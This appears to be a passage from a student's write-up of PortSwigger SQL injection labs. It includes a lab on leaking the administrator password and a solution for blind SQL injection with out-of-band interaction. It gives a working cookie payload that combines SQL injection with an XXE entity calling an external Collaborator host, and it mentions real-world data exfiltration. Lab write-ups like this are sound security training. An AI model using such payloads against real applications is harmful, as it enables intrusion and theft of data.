The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.

![WhatsApp Image 2023-05-31 at 09 50 30](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/178ae1c6-90fa-45d7-9a2c-62c92ad3e886)

![WhatsApp Image 2023-05-31 at 09 54 48](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/a10eb73a-81b0-484f-abd9-6191b46290eb)

![WhatsApp Image 2023-05-31 at 09 55 40](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/738aa79f-1df3-46cb-831a-a00f04da396a)

![WhatsApp Image 2023-05-31 at 10 03 28](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/0045211d-9256-4351-8340-8c5c29840ad1)

![WhatsApp Image 2023-05-31 at 10 04 46](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/9dcfe34d-631d-45b5-93c4-6a504773b7d8)

![WhatsApp Image 2023-05-31 at 10 06 03](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/98347ac2-d48d-45f1-b913-e3f06bc03cbf)

**Lab #17 : Blind SQL injection with out-of-band interaction**

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.
The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application.

![WhatsApp Image 2023-06-26 at 18 48 59](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/0066a881-9870-41f4-84e3-d0fe8cd4863e)

![WhatsApp Image 2023-06-26 at 18 52 27](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/86f2f223-7217-41c7-b644-8a8cbb3ed6d0)

![WhatsApp Image 2023-06-26 at 18 52 56](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/49eb5881-da0e-44b6-8eae-e641aef7bae4)

